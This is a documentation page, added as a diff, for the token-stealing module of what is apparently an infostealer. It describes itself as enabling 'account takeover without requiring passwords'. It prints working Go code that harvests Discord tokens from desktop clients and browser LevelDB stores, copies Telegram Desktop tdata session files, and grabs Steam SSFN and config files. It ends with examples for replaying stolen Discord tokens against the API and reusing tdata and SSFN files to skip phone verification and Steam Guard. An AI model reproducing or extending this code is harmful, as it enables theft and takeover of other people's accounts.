@@ -1,0 +1,562 @@
+---
+title: "Token Extraction"
+description: "Documentation for the tokens module - extracting Discord tokens, Telegram sessions, and Steam credentials"
+---
+
+## Overview
+
+The `tokens` module extracts authentication tokens and session data from Discord, Telegram, and Steam. These tokens can be used for account takeover without requiring passwords.
+
+<Warning>
+Discord tokens provide full account access. Telegram sessions allow login without phone verification.
+</Warning>
+
+## Data Structures
+
+### TokenData
+
+```go tokens/tokens.go:26-30
+type TokenData struct {
+    Tokens           []DiscordToken
+    TelegramSessions []TelegramSession
+    SteamData        *SteamData
+}
+```
+
+### DiscordToken
+
+```go tokens/tokens.go:32-40
+type DiscordToken struct {
+    Token    string
+    Email    string // filled by enrichToken if we validate
+    Phone    string
+    Username string
+    Nitro    bool
+    Billing  bool
+    Path     string // where we found it
+}
+```
+
+<ParamField path="Token" type="string">
+  Discord authentication token (format: `xxxx.yyyy.zzzz` or `mfa.xxxxxxxx`)
+</ParamField>
+
+<ParamField path="Path" type="string">
+  Source location (e.g., "Discord", "Chrome", "DiscordCanary")
+</ParamField>
+
+### TelegramSession
+
+```go tokens/tokens.go:42-45
+type TelegramSession struct {
+    Path  string
+    Files [][]byte // raw session data
+}
+```
+
+### SteamData
+
+```go tokens/tokens.go:47-51
+type SteamData struct {
+    SSFN      [][]byte // remember me tokens
+    ConfigVDF []byte
+    LoginVDF  []byte
+}
+```
+
+## Discord Token Extraction
+
+### Target Locations
+
+Discord tokens are stored in LevelDB files across multiple locations:
+
+```go tokens/tokens.go:55-83
+var discordPaths = map[string]string{
+    // Desktop Discord clients
+    "Discord":       filepath.Join(os.Getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
+    "DiscordCanary": filepath.Join(os.Getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
+    "DiscordPTB":    filepath.Join(os.Getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
+    "DiscordDev":    filepath.Join(os.Getenv("APPDATA"), "discorddevelopment", "Local Storage", "leveldb"),
+
+    // Browser sessions where people use web discord
+    "Chrome":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+    "Edge":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+    "Brave":          filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+    "Opera":          filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
+    "OperaGX":        filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
+    // ... more browsers
+}
+```
+
+### Token Formats
+
+Discord uses different token formats depending on account type:
+
+```go tokens/tokens.go:86-96
+var tokenPatterns = []*regexp.Regexp{
+    regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`),         // regular account
+    regexp.MustCompile(`mfa\.[\w-]{84}`),                         // MFA enabled
+    regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{38}`),         // newer format
+    regexp.MustCompile(`(dQw4w9WgXcQ:)[^.*\['(.*)'\].*$][^\"]+`), // encoded format
+}
+
+// encrypted token pattern (newer discord versions)
+var encryptedPattern = regexp.MustCompile(`dQw4w9WgXcQ:[^"]+`)
+```
+
+<Accordion title="Token Format Breakdown">
+**Regular Token:** `NDgyMzQ1NTY3ODkwMTIzNDU2.Gxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx`
+- Part 1: User ID (base64)
+- Part 2: Timestamp
+- Part 3: HMAC signature
+
+**MFA Token:** `mfa.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
+- 84 character token for accounts with 2FA enabled
+
+**Encrypted Token:** `dQw4w9WgXcQ:<base64_encrypted_data>`
+- Newer Discord versions encrypt tokens
+- Requires Local State key to decrypt
+</Accordion>
+
+### Main Extraction Function
+
+```go tokens/tokens.go:98-123
+func StealAll() *TokenData {
+    data := &TokenData{}
+
+    // Discord tokens from all locations
+    for name, path := range discordPaths {
+        tokens := extractDiscordTokens(path, name)
+        data.Tokens = append(data.Tokens, tokens...)
+    }
+
+    // remove duplicates (same token might be in multiple places)
+    data.Tokens = deduplicateTokens(data.Tokens)
+
+    // optionally validate tokens and get user info
+    for i := range data.Tokens {
+        enrichToken(&data.Tokens[i])
+    }
+
+    // Telegram tdata
+    data.TelegramSessions = extractTelegramSessions()
+
+    // Steam ssfn and configs
+    data.SteamData = extractSteamData()
+
+    return data
+}
+```
+
+### Extract Discord Tokens from LevelDB
+
+```go tokens/tokens.go:125-181
+func extractDiscordTokens(path, name string) []DiscordToken {
+    var tokens []DiscordToken
+
+    // check if path exists
+    if _, err := os.Stat(path); os.IsNotExist(err) {
+        return tokens
+    }
+
+    entries, err := os.ReadDir(path)
+    if err != nil {
+        return tokens
+    }
+
+    for _, entry := range entries {
+        if entry.IsDir() {
+            continue
+        }
+
+        // only look at leveldb files
+        ext := strings.ToLower(filepath.Ext(entry.Name()))
+        if ext != ".ldb" && ext != ".log" {
+            continue
+        }
+
+        content, err := os.ReadFile(filepath.Join(path, entry.Name()))
+        if err != nil {
+            continue
+        }
+
+        // Check for encrypted tokens first (newer discord)
+        encryptedMatches := encryptedPattern.FindAllString(string(content), -1)
+        for _, match := range encryptedMatches {
+            decrypted := decryptToken(match, path)
+            if decrypted != "" {
+                tokens = append(tokens, DiscordToken{
+                    Token: decrypted,
+                    Path:  name,
+                })
+            }
+        }
+
+        // Also check for plain tokens (older discord or web)
+        for _, pattern := range tokenPatterns {
+            matches := pattern.FindAllString(string(content), -1)
+            for _, match := range matches {
+                if isValidToken(match) {
+                    tokens = append(tokens, DiscordToken{
+                        Token: match,
+                        Path:  name,
+                    })
+                }
+            }
+        }
+    }
+
+    return tokens
+}
+```
+
+### Token Decryption
+
+Newer Discord versions encrypt tokens using the same method as Chrome passwords.
+
+```go tokens/tokens.go:185-236
+func decryptToken(encrypted, path string) string {
+    // split on colon
+    parts := strings.SplitN(encrypted, ":", 2)
+    if len(parts) != 2 {
+        return ""
+    }
+
+    decoded, err := base64.StdEncoding.DecodeString(parts[1])
+    if err != nil {
+        return ""
+    }
+
+    // need master key from Local State (same as chrome passwords)
+    localStatePath := filepath.Dir(filepath.Dir(path))
+    localStatePath = filepath.Join(localStatePath, "Local State")
+
+    content, err := os.ReadFile(localStatePath)
+    if err != nil {
+        return ""
+    }
+
+    var localState map[string]interface{}
+    if err := json.Unmarshal(content, &localState); err != nil {
+        return ""
+    }
+
+    osCrypt, ok := localState["os_crypt"].(map[string]interface{})
+    if !ok {
+        return ""
+    }
+
+    encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
+    if !ok {
+        return ""
+    }
+
+    encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
+    if err != nil {
+        return ""
+    }
+
+    // strip DPAPI prefix
+    if len(encryptedKey) > 5 && string(encryptedKey[:5]) == "DPAPI" {
+        encryptedKey = encryptedKey[5:]
+    }
+
+    // TODO: finish implementing DPAPI + AES-GCM decrypt
+    return ""
+}
+```
+
+<Note>
+Encrypted token decryption requires DPAPI and AES-GCM implementation (similar to browser password decryption).
+</Note>
+
+### Token Validation
+
+```go tokens/tokens.go:239-254
+func isValidToken(token string) bool {
+    // tokens should be at least 50 chars
+    if len(token) < 50 {
+        return false
+    }
+
+    // check format (should have 2 dots unless it's MFA token)
+    parts := strings.Split(token, ".")
+    if len(parts) < 3 {
+        if !strings.HasPrefix(token, "mfa.") {
+            return false
+        }
+    }
+
+    return true
+}
+```
+
+### Token Enrichment
+
+Tokens can be validated against Discord's API to fetch user information:
+
+```go tokens/tokens.go:272-277
+func enrichToken(token *DiscordToken) {
+    // would make request to https://discord.com/api/v9/users/@me
+    // with Authorization header
+    // returns user info including email, phone, nitro status, etc
+}
+```
+
+<Accordion title="Discord API Validation">
+To validate and enrich tokens:
+```bash
+curl -H "Authorization: <token>" https://discord.com/api/v9/users/@me
+```
+
+Response includes:
+- User ID, username, discriminator
+- Email address (if verified)
+- Phone number (if added)
+- Nitro subscription status
+- Payment methods
+</Accordion>
+
+## Telegram Session Extraction
+
+Telegram Desktop stores session files in the `tdata` directory. These files allow login without phone verification.
+
+```go tokens/tokens.go:281-329
+func extractTelegramSessions() []TelegramSession {
+    var sessions []TelegramSession
+
+    telegramPath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
+    if _, err := os.Stat(telegramPath); os.IsNotExist(err) {
+        return sessions
+    }
+
+    session := TelegramSession{Path: telegramPath}
+
+    // key_datas contains the key for decryption
+    keyDataPath := filepath.Join(telegramPath, "key_datas")
+    if content, err := os.ReadFile(keyDataPath); err == nil {
+        session.Files = append(session.Files, content)
+    }
+
+    // Look for the hex-named folders
+    // Telegram creates folders with 16-char hex names
+    entries, err := os.ReadDir(telegramPath)
+    if err != nil {
+        return sessions
+    }
+
+    for _, entry := range entries {
+        if !entry.IsDir() {
+            continue
+        }
+
+        name := entry.Name()
+        // telegram data folders are 16 hex chars
+        if len(name) == 16 && isHexString(name) {
+            folderPath := filepath.Join(telegramPath, name)
+
+            // grab map files
+            mapFiles, _ := filepath.Glob(filepath.Join(folderPath, "map*"))
+            for _, mapFile := range mapFiles {
+                if content, err := os.ReadFile(mapFile); err == nil {
+                    session.Files = append(session.Files, content)
+                }
+            }
+        }
+    }
+
+    if len(session.Files) > 0 {
+        sessions = append(sessions, session)
+    }
+
+    return sessions
+}
+```
+
+<Accordion title="Telegram Session Files">
+**Important files:**
+- `key_datas` - Main encryption key
+- `<16_hex_chars>/` - User data folders
+- `map*` files - Encrypted session data
+
+**Usage:**
+Copy entire `tdata` folder to another machine with Telegram Desktop to gain account access without phone verification.
+</Accordion>
+
+### Hex String Validation
+
+```go tokens/tokens.go:382-389
+func isHexString(s string) bool {
+    for _, c := range s {
+        if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+            return false
+        }
+    }
+    return true
+}
+```
+
+## Steam Data Extraction
+
+Steam stores "remember me" tokens in SSFN files and account info in VDF config files.
+
+```go tokens/tokens.go:333-379
+func extractSteamData() *SteamData {
+    // Steam can be in Program Files or Program Files (x86)
+    steamPath := filepath.Join(os.Getenv("PROGRAMFILES(X86)"), "Steam")
+    if _, err := os.Stat(steamPath); os.IsNotExist(err) {
+        steamPath = filepath.Join(os.Getenv("PROGRAMFILES"), "Steam")
+        if _, err := os.Stat(steamPath); os.IsNotExist(err) {
+            return nil // no steam installed
+        }
+    }
+
+    data := &SteamData{}
+
+    // grab SSFN files (these are login tokens)
+    entries, err := os.ReadDir(steamPath)
+    if err != nil {
+        return nil
+    }
+
+    for _, entry := range entries {
+        if strings.HasPrefix(entry.Name(), "ssfn") {
+            content, err := os.ReadFile(filepath.Join(steamPath, entry.Name()))
+            if err != nil {
+                continue
+            }
+            data.SSFN = append(data.SSFN, content)
+        }
+    }
+
+    // grab config.vdf (has saved credentials)
+    configPath := filepath.Join(steamPath, "config", "config.vdf")
+    if content, err := os.ReadFile(configPath); err == nil {
+        data.ConfigVDF = content
+    }
+
+    // grab loginusers.vdf (has account info)
+    loginPath := filepath.Join(steamPath, "config", "loginusers.vdf")
+    if content, err := os.ReadFile(loginPath); err == nil {
+        data.LoginVDF = content
+    }
+
+    if len(data.SSFN) == 0 && data.ConfigVDF == nil && data.LoginVDF == nil {
+        return nil
+    }
+
+    return data
+}
+```
+
+<Accordion title="Steam Files Explained">
+**SSFN files:**
+- Format: `ssfn<numbers>`
+- Steam Sentry File Name - remember me tokens
+- Allows login without Steam Guard code
+
+**config.vdf:**
+- Valve Data Format text file
+- Contains Steam settings and saved login info
+
+**loginusers.vdf:**
+- List of accounts that have logged in
+- Includes Steam IDs, usernames, and last login time
+</Accordion>
+
+## Token Deduplication
+
+Removes duplicate tokens found in multiple locations:
+
+```go tokens/tokens.go:257-269
+func deduplicateTokens(tokens []DiscordToken) []DiscordToken {
+    seen := make(map[string]bool)
+    var unique []DiscordToken
+
+    for _, token := range tokens {
+        if !seen[token.Token] {
+            seen[token.Token] = true
+            unique = append(unique, token)
+        }
+    }
+
+    return unique
+}
+```
+
+## Usage Examples
+
+### Discord Token Usage
+
+<CodeGroup>
+```python Python
+import requests
+
+token = "NDgyMzQ1NTY3ODkwMTIzNDU2.Gxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+headers = {
+    "Authorization": token
+}
+
+# Get user info
+user_info = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+print(user_info.json())
+
+# Send message
+requests.post(
+    "https://discord.com/api/v9/channels/<channel_id>/messages",
+    headers=headers,
+    json={"content": "Hello from token!"}
+)
+```
+
+```javascript JavaScript
+const token = "NDgyMzQ1NTY3ODkwMTIzNDU2.Gxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx";
+
+fetch("https://discord.com/api/v9/users/@me", {
+  headers: {
+    "Authorization": token
+  }
+})
+.then(res => res.json())
+.then(console.log);
+```
+</CodeGroup>
+
+### Telegram Session Import
+
+```bash
+# Copy tdata folder to Telegram Desktop directory
+cp -r tdata/ "C:\Users\<user>\AppData\Roaming\Telegram Desktop\"
+
+# Launch Telegram Desktop - will be logged in automatically
+```
+
+### Steam SSFN Usage
+
+```bash
+# Copy SSFN file to Steam directory
+cp ssfn* "C:\Program Files (x86)\Steam\"
+
+# Steam will recognize the file and skip Steam Guard
+```
+
+## Security Considerations
+
+<Warning>
+**Token Security:**
+- Discord tokens provide full account access
+- Can be used to:
+  - Read all messages
+  - Send messages
+  - Join/leave servers
+  - Access billing info
+  - Enable/disable 2FA
+</Warning>
+
+<Note>
+**Token Rotation:**
+- Discord rotates tokens on password change
+- Telegram sessions can be revoked from active sessions menu
+- Steam SSFN files expire after ~2 weeks of inactivity
+</Note>
